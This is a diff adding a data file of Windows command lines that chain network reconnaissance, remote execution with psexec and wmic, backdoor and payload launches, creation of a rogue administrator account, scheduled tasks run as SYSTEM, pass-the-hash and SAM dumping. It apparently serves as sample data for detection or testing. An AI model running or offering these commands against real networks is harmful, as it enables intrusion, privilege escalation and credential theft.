@@ -1,0 +1,22 @@
+commandline
+ipconfig /all
+arp -a
+net view
+nbtstat -A 192.168.1.10
+"net group ""domain computers"" /domain"
+net use z: \\target-server\c$ /user:domain\validuser ValidPass123!
+sc query \\target-server
+"wmic /node:""target-server"" service where (state=""running"") get name"
+psexec.exe \\target-server -u domain\adminuser -p AdminPass123! cmd.exe
+psexec.exe \\target-server -s cmd.exe
+psexec.exe \\fileserver -u domain\service_account -p ServicePass123! -c malware.exe
+"wmic /node:""webserver"" /user:""domain\adminuser"" /password:""AdminPass123!"" process call create ""cmd.exe /c powershell -ep bypass -f \\share\backdoor.ps1"""
+"wmic /node:""dbserver"" process call create ""cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add"""
+"schtasks /create /S target-server /RU ""SYSTEM"" /SC ONSTART /TN ""Update"" /TR ""powershell -ep bypass -f \\share\payload.ps1"""
+"schtasks /run /S target-server /I /TN ""Update"""
+powershell Enable-PSRemoting -Force
+powershell Invoke-Command -ComputerName target-server -ScriptBlock {whoami} -Credential domain\adminuser
+powershell Enter-PSSession -ComputerName target-server -Credential domain\adminuser
+sekurlsa::pth /user:adminuser /domain:domain.local /ntlm:hash_value /run:cmd.exe
+crackmapexec smb 192.168.1.0/24 -u adminuser -p AdminPass123! --shares
+crackmapexec smb 192.168.1.0/24 -u adminuser -H hash_value --sam
